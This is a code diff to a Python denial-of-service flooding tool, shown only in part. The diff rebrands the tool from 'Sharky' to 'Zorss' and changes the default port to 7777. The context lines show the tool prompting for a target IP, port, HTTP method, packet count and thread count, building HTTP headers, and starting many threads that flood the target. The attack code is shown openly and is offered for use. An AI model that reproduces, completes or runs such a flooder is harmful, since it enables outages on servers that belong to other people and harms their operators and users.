@@ -864,11 +864,11 @@ print(" ╚═══██╗██╔══██║██╔══██║█
 print("██████╔╝██║  ██║██║  ██║██║  ██║██║ ╚██╗   ██║         ██████╔╝██████╔╝╚█████╔╝██████╔╝")
 print("╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝         ╚═════╝ ╚═════╝  ╚════╝ ╚═════╝ ")
 print("=======================================================================================")
-print("[ + ] Author/Use : Sharky")
-print("[ + ] Update Tool: Sharky")
+print("[ + ] Author/Use : Zorss")
+print("[ + ] Update Tool: Zorss")
 print("==========================")
 ip = str(input("[+] Target IP : "))
-port = int(input("[+] Port [80] : "))
+port = int(input("[+] Port [7777] : "))
 method_attack = str(input("[+] Method [Get/Post/Head] : "))
 times = int(input("[+] Enter Packet [120000] : "))
 threads = int(input("[+] Enter Thread [18048]  : "))
@@ -903,7 +903,7 @@ def Headers(method, referers=None):
         header = post_host + referer + forward + useragent + accept + content + connection +  length + "\r\n\r\n"
     return header
     
-os.system('color ' +random.choice(['B'])+ " & cls & title Tools DDoS Used By Sharky [ DDoS Attack ]")
+os.system('color ' +random.choice(['B'])+ " & cls & title Tools DDoS Used By Zorss [ DDoS Attack ]")
 def run():
     header = Headers("get")
     i = random.choice(("[*]","[!]","[#]"))
@@ -955,7 +955,7 @@ def run():
             print(i +" Sent!!!")
         except socket.error:
             s.close()
-            print("[ + ] Sharky Attacking Server IP => ",ip," In Port ",port,"!")
+            print("[ + ] Zorss Attacking Server IP => ",ip," In Port ",port,"!")
 
 for y in range(threads):
     th = threading.Thread(target = run)
